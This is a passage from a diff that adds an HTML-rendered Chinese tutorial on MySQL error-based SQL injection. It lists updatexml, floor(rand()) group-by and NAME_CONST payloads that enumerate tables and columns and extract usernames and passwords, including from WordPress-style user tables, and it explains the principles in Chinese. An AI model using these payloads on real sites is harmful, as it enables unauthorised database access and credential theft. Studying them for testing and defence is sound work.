+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sectest&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;make_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;获取列名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;COLUMNS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;wp_user_&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;make_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;columns&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;users&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;获取数据&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wp_user_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wp_user_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GROUP_CONCAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x3a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wp_user_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;make_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;三要素显错注入&#34;&gt;三要素显错注入&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;三要素原理分析&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;floor(x) 返回&amp;lt;=x的最大整数&lt;/li&gt;
+&lt;li&gt;rand(0) 在给了随机种子0之后，将产生固定伪随机序列&lt;/li&gt;
+&lt;li&gt;floor(rand(0)*2) 最终产生的可预测伪随机序列是&#39;011011&amp;hellip;&#39;&lt;/li&gt;
+&lt;li&gt;使用count(*) 和 group by统计数据，就是建立虚拟表，对每条记录计算统计键，无则插入，有则+1&lt;/li&gt;
+&lt;li&gt;当以foor(rand(0*2))为键使用group by 分组统计时：针对查询表第一条记录，插入前第1次计算值为0，查无此键，进行插入时第2次计算值为1，查无此键，插入即可，实际插入虚拟表的第一条记录键为1；针对查询表第二条记录，插入前第3次计算值为1，查有此键，则直接将count+1，不再进行插入时的计算；针对第三条记录，插入前第4次计算值为0，查无此键，进行插入时第5次计算值为1，查有此键，虚拟表主键唯一，无法插入报错！！！&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;核心其实就是固定的伪随机序列和多次计算&lt;/p&gt;
+&lt;p&gt;三要素(count、rand、group by)再加一个要素就是原始&lt;strong&gt;查询表记录至少为3条&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在查询结果上再执行查询时，必须给定一个别名&lt;/p&gt;
+&lt;p&gt;limit 0,1 -&amp;gt; offset + 偏移量 表示最后返回的记录条数&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_43803070/article/details/96448914&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/weixin_43803070/article/details/96448914&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select 1 from (select count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;注意点：上述两个&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload注出来的数据后跟着一个数字&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，因为&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat了一个&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;其他特性利用&#34;&gt;其他特性利用&lt;/h3&gt;
+&lt;h4 id=&#34;列名重复&#34;&gt;列名重复&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;NAME_CONST可以制造一个列，利用列名重复报错&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;常根据官方文档，name_const函数要求参数必须是&lt;strong&gt;常量&lt;/strong&gt;，所以实际使用上还没有比较好的利用方式。但利用这个特性加上join函数可以爆列名&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NAME_CONST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NAME_CONST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
